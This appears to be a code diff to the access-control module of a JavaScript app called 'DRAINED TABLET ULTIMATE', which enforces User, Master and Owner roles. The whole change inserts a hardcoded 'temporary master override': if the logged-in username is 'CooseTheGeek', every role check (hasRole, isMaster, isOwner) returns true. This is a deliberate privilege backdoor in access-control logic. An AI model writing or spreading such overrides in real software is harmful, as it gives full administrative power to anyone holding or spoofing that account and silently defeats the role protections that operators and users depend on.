@@ -1,6 +1,4 @@
-// access-control.js – DRAINED TABLET ULTIMATE v7.0.0
-// Three‑tier role enforcement: User, Master, Owner.
-// Provides permission checks for UI elements and command execution.
+// access-control.js – DRAINED TABLET ULTIMATE v7.0.0 (with temporary master override)
 
 class AccessControl {
     constructor() {
@@ -15,22 +13,36 @@ class AccessControl {
     }
 
     init() {
-        // No direct UI creation; this is a utility module.
         console.log('AccessControl initialized');
+    }
+
+    // Temporary override for CooseTheGeek
+    isMasterUser() {
+        return AppState.user && AppState.user.username === 'CooseTheGeek';
     }
 
     // Check if current user has at least the required role
     hasRole(requiredRole) {
+        // Override: if user is CooseTheGeek, always return true for any role
+        if (this.isMasterUser()) {
+            return true;
+        }
         const currentRole = AppState.user.role || 'user';
         return this.roleHierarchy[currentRole] >= this.roleHierarchy[requiredRole];
     }
 
-    // Check if current user is specifically a master (or owner)
+    // Check if current user is specifically a master
     isMaster() {
+        if (this.isMasterUser()) {
+            return true;
+        }
         return AppState.user.role === 'master';
     }
 
     isOwner() {
+        if (this.isMasterUser()) {
+            return true;
+        }
         return AppState.user.role === 'owner';
     }
 
@@ -55,7 +67,6 @@ class AccessControl {
     // Hide/show UI elements based on role
     applyUIPermissions() {
         // This can be called after login to hide elements the user shouldn't see.
-        // Example: hide master-only tabs.
         if (!this.hasRole('master')) {
             document.querySelectorAll('.master-only').forEach(el => el.style.display = 'none');
         }
